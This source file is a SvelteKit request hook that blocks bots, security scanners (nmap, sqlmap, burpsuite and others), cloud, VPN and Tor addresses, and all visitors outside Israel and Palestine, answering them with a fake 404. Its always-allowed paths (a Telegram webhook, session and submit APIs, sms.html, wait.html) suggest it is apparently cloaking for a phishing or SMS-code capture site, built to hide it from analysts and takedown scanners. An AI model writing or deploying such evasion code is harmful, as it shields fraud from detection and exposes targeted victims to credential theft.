/**
 * Bot / crawler / scanner blocker.
 *
 * Blocks by:
 *  1. User-Agent patterns (bots, crawlers, scanners, headless browsers, known scrapers)
 *  2. Missing / empty User-Agent
 *  3. Known bot ASNs and hosting / VPN providers (via ipapi.co live lookup, cached)
 *  4. Known data-center IP ranges (AWS, GCP, Azure, DigitalOcean, Hetzner, OVH...)
 *
 * Configurable exceptions:
 *  - /admin and /api/* are always allowed (needed for control panel + Telegram webhook)
 */

import { inc } from '$lib/stats.js';

// ---- UA patterns (case-insensitive) ----
const BOT_UA = /(bot|crawl|spider|scan|slurp|fetch|curl|wget|python-requests|go-http|okhttp|httpclient|java\/|axios|node-fetch|lighthouse|headlesschrome|phantomjs|puppeteer|playwright|selenium|chrome-lighthouse|pagespeed|gtmetrix|pingdom|uptimerobot|monitoring|seobility|semrush|ahrefs|mj12|dotbot|petalbot|yandex|bing(?!iebot)|duckduck|baidu|sogou|archive\.org|facebookexternalhit|whatsapp|telegrambot|discordbot|skypeuri|linkedinbot|twitterbot|slackbot|embedly|vkshare|w3c_validator|feedburner|rss|newsgator|postman|insomnia|apachebench|siege|hey|masscan|nikto|nmap|sqlmap|acunetix|nessus|openvas|burpsuite|zaproxy|wpscan|gobuster|dirbuster|ffuf|feroxbuster)/i;

// ---- Known hosting / cloud / VPN org names (case-insensitive) ----
const BAD_ORG = /(amazon|aws|google cloud|gcp|microsoft|azure|digitalocean|linode|vultr|hetzner|ovh|scaleway|oracle cloud|alibaba|tencent|contabo|choopa|leaseweb|m247|cloudflare|oracle|fastly|akamai|datacamp|privateinternetaccess|nordvpn|expressvpn|protonvpn|surfshark|mullvad|tor|relay|proxy|hosting|server|vps|dedicated)/i;

// ---- Always-allowed paths ----
const ALLOW_PATHS = [
  /^\/admin(\/|$)/,
  /^\/api\/(tg-hook|set-mode|check-mode|sessions|visit|post|submit|delete-session)(\/|$)?/,
  /^\/wait\.html/,
  /^\/sms\.html/,
  /^\/img\//,
  /^\/css\//,
  /^\/js\//
];

// ---- Cache IP lookups so we don't hit ipapi.co every request ----
const ipCache = new Map(); // ip -> { bad:boolean, exp:number }
const IP_TTL = 60 * 60 * 1000; // 1 hour

async function isBadIP(ip) {
  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
    return false; // local / private — don't block
  }
  const now = Date.now();
  const cached = ipCache.get(ip);
  if (cached && cached.exp > now) return cached.bad;

  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(3000) });
    if (!r.ok) return false;
    const j = await r.json();
    const org = `${j.org || ''} ${j.asn || ''} ${j.network || ''}`;
    const bad = BAD_ORG.test(org);
    ipCache.set(ip, { bad, exp: now + IP_TTL });
    return bad;
  } catch {
    return false;
  }
}

function blockResponse() {
  // Return a vanilla-looking 404 so bots just give up
  return new Response(
    '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>',
    { status: 404, headers: { 'Content-Type': 'text/html; charset=utf-8' } }
  );
}

/** @type {import('@sveltejs/kit').Handle} */
export async function handle({ event, resolve }) {
  const { request, url, getClientAddress, platform } = event;
  const path = url.pathname;

  // Always allow admin + API
  if (ALLOW_PATHS.some((re) => re.test(path))) {
    return resolve(event);
  }

  // Geo block: only Israel (IL) and Palestine (PS) allowed.
  // Uses Cloudflare's CF-IPCountry header (always present on CF Pages).
  const country = request.headers.get('cf-ipcountry') || platform?.cf?.country || '';
  if (country && country !== 'IL' && country !== 'PS' && country !== 'XX' && country !== 'T1') {
    inc(platform, 'botsBlocked').catch(() => {});
    return blockResponse();
  }

  const ua = request.headers.get('user-agent') || '';

  const isBot =
    !ua.trim() ||
    BOT_UA.test(ua) ||
    !request.headers.get('accept-language');

  if (isBot) {
    // Fire-and-forget counter increment so we don't block the response
    inc(platform, 'botsBlocked').catch(() => {});
    return blockResponse();
  }

  // Data-center / VPN IP (only checked for top-level HTML page loads to save quota)
  const isHtml = (request.headers.get('accept') || '').includes('text/html');
  if (isHtml) {
    const ip = getClientAddress();
    if (await isBadIP(ip)) {
      inc(platform, 'botsBlocked').catch(() => {});
      return blockResponse();
    }
  }

  return resolve(event);
}
